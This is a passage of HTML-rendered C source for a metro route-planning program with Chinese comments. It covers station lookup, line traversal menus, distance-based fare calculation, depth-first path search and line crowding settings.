(s[i].Linjienum - <span class="number">1</span>); j++)</span><br><span class="line">				&#123;</span><br><span class="line">					q = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">					<span class="keyword">if</span> (<span class="number">5</span> == <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d %d %lf %d %d&quot;</span>, &amp;(q-&gt;line), &amp;(q-&gt;IsTransfer), &amp;(q-&gt;distance), &amp;(q-&gt;nextline), &amp;(q-&gt;nextnumber)))</span><br><span class="line">					&#123;</span><br><span class="line">						p-&gt;next = q;</span><br><span class="line">						p = q;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;文件读取错误！\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;文件读取错误！\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件读取错误！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：FindStation</span></span><br><span class="line"><span class="comment">*函数功能：由站点的线路号和序号返回该站点</span></span><br><span class="line"><span class="comment">*返回类型：Station类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function">Station <span class="title">FindStation</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">226</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((s[i].line == l) &amp;&amp; (s[i].number == n))</span><br><span class="line">			<span class="keyword">return</span> s[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：FindNumber</span></span><br><span class="line"><span class="comment">*函数功能：由站点的线路号和序号返回该站点的序号</span></span><br><span class="line"><span class="comment">*返回类型：int类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindNumber</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">226</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((s[i].line == l) &amp;&amp; (s[i].number == n))</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：TraverseLine</span></span><br><span class="line"><span class="comment">*函数功能：遍历功能的主函数</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseLine</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------------线路遍历--------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;   请选择遍历的方式： 1.遍历整条线路\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;                      2.输入站点开始遍历\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;                      0.返回上一级\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> choice=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (choice)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;   请输入选择：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">		Log(privacy,choice);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (choice)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入线号：&quot;</span>);</span><br><span class="line">			<span class="keyword">int</span> l;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;l);</span><br><span class="line">			Log(privacy,l);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d号线站点依次为：&quot;</span>, l);</span><br><span class="line">			TraverseByLine(l);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n当前线路遍历结束！\n&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入开始站点的线号和序号：&quot;</span>);</span><br><span class="line">			<span class="keyword">int</span> l1, n1;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l1, &amp;n1);</span><br><span class="line">			Log(privacy, l1);</span><br><span class="line">			Log(privacy, n1);</span><br><span class="line">			TraverseByStation(l1, n1);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;已经遍历结束！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：TraverseByLine</span></span><br><span class="line"><span class="comment">*函数功能：遍历功能的子函数，按照线路遍历</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseByLine</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">switch</span> (number)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		max = <span class="number">32</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		max = <span class="number">38</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		max = <span class="number">24</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">		max = <span class="number">37</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		max = <span class="number">32</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">		max = <span class="number">37</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">		max = <span class="number">26</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">226</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (s[i].line == number)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, FindStation(s[i].line, s[i].number).name);</span><br><span class="line">			<span class="keyword">if</span> (s[i].number != max)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：TraverseByStation</span></span><br><span class="line"><span class="comment">*函数功能：遍历功能的子函数，按照站点逐次遍历</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseByStation</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Station temp = FindStation(l, n);</span><br><span class="line">	<span class="keyword">int</span> i, choice;</span><br><span class="line">	EdgeNode* p;</span><br><span class="line">	p = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">	p = temp.next;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;当前站点名称为：%s&quot;</span>, temp.name);</span><br><span class="line">	<span class="keyword">if</span> (temp.Linjienum &gt; <span class="number">2</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(可换乘)&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;当前站点相邻站点有：\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; temp.Linjienum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Station temp1 = FindStation(p-&gt;nextline, p-&gt;nextnumber);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\t\t%d %s&quot;</span>, i + <span class="number">1</span>, temp1.name);</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;IsTransfer == <span class="number">1</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;(需要换乘至%d号线）&quot;</span>, p-&gt;line);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t0 退出\n请输入选择：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">	Log(privacy, choice);</span><br><span class="line">	<span class="keyword">if</span> (choice != <span class="number">0</span>)<span class="comment">//递归进入选择的站点</span></span><br><span class="line">	&#123;</span><br><span class="line">		p = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">		p = temp.next;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; choice; j++)</span><br><span class="line">			p = p-&gt;next;</span><br><span class="line">		TraverseByStation(p-&gt;nextline, p-&gt;nextnumber);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：CheckFare</span></span><br><span class="line"><span class="comment">*函数功能：由路径分段算出价格并返回</span></span><br><span class="line"><span class="comment">*返回类型：double类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">CheckFare</span><span class="params">(<span class="keyword">double</span> distance)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> fare;</span><br><span class="line">	<span class="keyword">if</span> (distance &lt;= <span class="number">4.0</span>)</span><br><span class="line">		fare = <span class="number">2.0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (distance &lt;= <span class="number">12.0</span>)</span><br><span class="line">		fare = <span class="number">2.0</span> + (distance - <span class="number">4.0</span>) / <span class="number">4.0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (distance &lt;= <span class="number">24.0</span>)</span><br><span class="line">		fare = <span class="number">4.0</span> + (distance - <span class="number">12.0</span>) / <span class="number">6.0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (distance &lt;= <span class="number">40.0</span>)</span><br><span class="line">		fare = <span class="number">6.0</span> + (distance - <span class="number">24.0</span>) / <span class="number">8.0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (distance &lt;= <span class="number">50.0</span>)</span><br><span class="line">		fare = <span class="number">8.0</span> + (distance - <span class="number">40.0</span>) / <span class="number">10.0</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		fare = <span class="number">9.0</span> + (distance - <span class="number">50.0</span>) / <span class="number">20.0</span>;</span><br><span class="line">	<span class="keyword">return</span> fare;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：IntiaPath</span></span><br><span class="line"><span class="comment">*函数功能：初始化路径变量</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IntiaPath</span><span class="params">(<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	path[m].distance = <span class="number">0</span>;</span><br><span class="line">	path[m].fare = <span class="number">0</span>;</span><br><span class="line">	path[m].minute = <span class="number">0</span>;</span><br><span class="line">	path[m].HuanNum = <span class="number">0</span>;</span><br><span class="line">	path[m].crowding = <span class="number">0</span>;</span><br><span class="line">	path[m].NotGet = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">226</span>; i++)</span><br><span class="line">		path[m].s[i].line = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：CopyPath</span></span><br><span class="line"><span class="comment">*函数功能：将已经找到的路径存储起来</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyPath</span><span class="params">(<span class="keyword">int</span> m1, <span class="keyword">int</span> m2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	IntiaPath(m2);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; path[m1].s[i].line != <span class="number">0</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		path[m2].s[i] = path[m1].s[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：MaxNum</span></span><br><span class="line"><span class="comment">*函数功能：返回两者之中较大值</span></span><br><span class="line"><span class="comment">*返回类型：int类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MaxNum</span><span class="params">(<span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (n1 &gt;=n2)</span><br><span class="line">		<span class="keyword">return</span> n1;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> n2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：CheckPath</span></span><br><span class="line"><span class="comment">*函数功能：将存储的路径中站点数量最大的那条归0待用</span></span><br><span class="line"><span class="comment">*返回类型：int类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CheckPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//从1-10路径中找到最长的一条，并将下标返回</span></span><br><span class="line">	<span class="keyword">int</span> n1, n2, n3,n4,n5,n6,n7,n8,n9,n10;</span><br><span class="line">	<span class="keyword">int</span> max;</span><br><span class="line">	<span class="keyword">for</span> (n1 = <span class="number">0</span>; path[<span class="number">1</span>].s[n1].line != <span class="number">0</span>; n1++);</span><br><span class="line">	<span class="keyword">for</span> (n2 = <span class="number">0</span>; path[<span class="number">2</span>].s[n2].line != <span class="number">0</span>; n2++);</span><br><span class="line">	<span class="keyword">for</span> (n3 = <span class="number">0</span>; path[<span class="number">3</span>].s[n3].line != <span class="number">0</span>; n3++);</span><br><span class="line">	<span class="keyword">for</span> (n4 = <span class="number">0</span>; path[<span class="number">4</span>].s[n4].line != <span class="number">0</span>; n4++);</span><br><span class="line">	<span class="keyword">for</span> (n5 = <span class="number">0</span>; path[<span class="number">5</span>].s[n5].line != <span class="number">0</span>; n5++);</span><br><span class="line">	<span class="keyword">for</span> (n6 = <span class="number">0</span>; path[<span class="number">6</span>].s[n6].line != <span class="number">0</span>; n6++);</span><br><span class="line">	<span class="keyword">for</span> (n7 = <span class="number">0</span>; path[<span class="number">7</span>].s[n7].line != <span class="number">0</span>; n7++);</span><br><span class="line">	<span class="keyword">for</span> (n8 = <span class="number">0</span>; path[<span class="number">8</span>].s[n8].line != <span class="number">0</span>; n8++);</span><br><span class="line">	<span class="keyword">for</span> (n9 = <span class="number">0</span>; path[<span class="number">9</span>].s[n9].line != <span class="number">0</span>; n9++);</span><br><span class="line">	<span class="keyword">for</span> (n10 = <span class="number">0</span>; path[<span class="number">10</span>].s[n10].line != <span class="number">0</span>; n10++);</span><br><span class="line">	<span class="comment">//找出最大的下标</span></span><br><span class="line">	max = MaxNum(n1, MaxNum(n2, MaxNum(n3, MaxNum(n4, MaxNum(n5, MaxNum(n6,MaxNum(n7,MaxNum(n8,MaxNum(n9,n10)))))))));</span><br><span class="line">	<span class="keyword">if</span> (max == n1) max = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n2) max = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n3) max = <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n4) max = <span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n5) max = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n6) max = <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n7) max = <span class="number">7</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n8) max = <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n9) max = <span class="number">9</span>;</span><br><span class="line">	<span class="keyword">if</span> (max == n10) max = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：CountPathNum</span></span><br><span class="line"><span class="comment">*函数功能：计算路径中站点的数量并返回</span></span><br><span class="line"><span class="comment">*返回类型：int类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CountPathNum</span><span class="params">(<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; path[m].s[i].line != <span class="number">0</span>; i++);</span><br><span class="line">	<span class="keyword">return</span> i ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：Pop</span></span><br><span class="line"><span class="comment">*函数功能：将堆栈中栈顶元素弹出</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; path[<span class="number">0</span>].s[i].line != <span class="number">0</span>; i++) &#123;&#125;</span><br><span class="line">	<span class="comment">//s[i]为栈顶,未存储元素</span></span><br><span class="line">	path[<span class="number">0</span>].s[i - <span class="number">1</span>].line = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：Push</span></span><br><span class="line"><span class="comment">*函数功能：向堆栈中存储元素</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(Station sta)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; path[<span class="number">0</span>].s[i].line != <span class="number">0</span>; i++) &#123;&#125;</span><br><span class="line">	<span class="comment">//s[i]为栈顶</span></span><br><span class="line">	path[<span class="number">0</span>].s[i] = sta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：Visited</span></span><br><span class="line"><span class="comment">*函数功能：改变站点的标志位</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Visited</span><span class="params">(Station* st, <span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	st-&gt;IsPassed = flag;</span><br><span class="line">	<span class="keyword">if</span> (st-&gt;Linjienum &gt; <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">226</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s[i].name,st-&gt;name))</span><br><span class="line">				s[i].IsPassed = st-&gt;IsPassed;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：DFS</span></span><br><span class="line"><span class="comment">*函数功能：深度优先寻找路径并存储</span></span><br><span class="line"><span class="comment">*返回类型：bool类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> l1, <span class="keyword">int</span> n1, <span class="keyword">int</span> l2, <span class="keyword">int</span> n2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//优化：若当前在查找路径多过已存在路径长度，则直接取消查找</span></span><br><span class="line">	<span class="keyword">if</span> (pathnumber &gt; <span class="number">10</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (CountPathNum(<span class="number">0</span>) &gt; CountPathNum(CheckPath()))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> temp = FindNumber(l1, n1);</span><br><span class="line">	<span class="keyword">if</span> (s[temp].IsPassed == <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	Push(s[temp]);</span><br><span class="line">	Visited(&amp;s[temp], <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s[temp].name, (FindStation(l2, n2).name)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//找到路径后，将路径存储到数组内</span></span><br><span class="line">		<span class="keyword">if</span> (pathnumber &lt;= <span class="number">10</span>)<span class="comment">//最开始的10条路径未存完</span></span><br><span class="line">			CopyPath(<span class="number">0</span>, pathnumber++);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			CopyPath(<span class="number">0</span>, CheckPath());</span><br><span class="line">		&#125;</span><br><span class="line">		Visited(&amp;s[temp], <span class="number">0</span>);</span><br><span class="line">		Pop();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	EdgeNode* p;</span><br><span class="line">	p = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">	<span class="keyword">for</span> (p = s[temp].next; p!=<span class="literal">NULL</span>; p = p-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (DFS(p-&gt;nextline, p-&gt;nextnumber, l2, n2))</span><br><span class="line">		&#123;</span><br><span class="line">			Pop();</span><br><span class="line">			Visited(&amp;s[temp], <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			<span class="comment">//当前点为终点上一节点，该点弹出并复位，从当前点上一节点重新搜索</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Visited(&amp;s[temp], <span class="number">0</span>);</span><br><span class="line">	Pop();</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="comment">//当前点所有邻接边没有通路，弹出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：IntiaLine</span></span><br><span class="line"><span class="comment">*函数功能：初始化线路</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IntiaLine</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//对一号线</span></span><br><span class="line">	line[<span class="number">0</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">0</span>].end_number = <span class="number">32</span>;</span><br><span class="line">	line[<span class="number">0</span>].crowding = <span class="number">0.4</span>;</span><br><span class="line">	line[<span class="number">0</span>].crow[<span class="number">0</span>] = <span class="number">0.8</span>;<span class="comment">//上班</span></span><br><span class="line">	line[<span class="number">0</span>].crow[<span class="number">1</span>] = <span class="number">0.75</span>;<span class="comment">//下班</span></span><br><span class="line">	line[<span class="number">0</span>].crow[<span class="number">2</span>] = <span class="number">0.4</span>;<span class="comment">//正常</span></span><br><span class="line">	line[<span class="number">0</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//二号线</span></span><br><span class="line">	line[<span class="number">1</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">1</span>].end_number = <span class="number">38</span>;</span><br><span class="line">	line[<span class="number">1</span>].crowding = <span class="number">0.5</span>;</span><br><span class="line">	line[<span class="number">1</span>].crow[<span class="number">0</span>] = <span class="number">0.5</span>;</span><br><span class="line">	line[<span class="number">1</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//三号线</span></span><br><span class="line">	line[<span class="number">2</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">2</span>].end_number = <span class="number">24</span>;</span><br><span class="line">	line[<span class="number">2</span>].crowding = <span class="number">0.4</span>;</span><br><span class="line">	line[<span class="number">2</span>].crow[<span class="number">0</span>] = <span class="number">0.8</span>;<span class="comment">//上班</span></span><br><span class="line">	line[<span class="number">2</span>].crow[<span class="number">1</span>] = <span class="number">0.75</span>;<span class="comment">//下班</span></span><br><span class="line">	line[<span class="number">2</span>].crow[<span class="number">2</span>] = <span class="number">0.4</span>;<span class="comment">//正常</span></span><br><span class="line">	line[<span class="number">2</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//四号线</span></span><br><span class="line">	line[<span class="number">3</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">3</span>].end_number = <span class="number">37</span>;</span><br><span class="line">	line[<span class="number">3</span>].crowding = <span class="number">0.5</span>;</span><br><span class="line">	line[<span class="number">3</span>].crow[<span class="number">0</span>] = <span class="number">0.5</span>;</span><br><span class="line">	line[<span class="number">3</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//六号线</span></span><br><span class="line">	line[<span class="number">5</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">5</span>].end_number = <span class="number">32</span>;</span><br><span class="line">	line[<span class="number">5</span>].crowding = <span class="number">0.15</span>;</span><br><span class="line">	line[<span class="number">5</span>].crow[<span class="number">0</span>] = <span class="number">0.65</span>;<span class="comment">//娱乐</span></span><br><span class="line">	line[<span class="number">5</span>].crow[<span 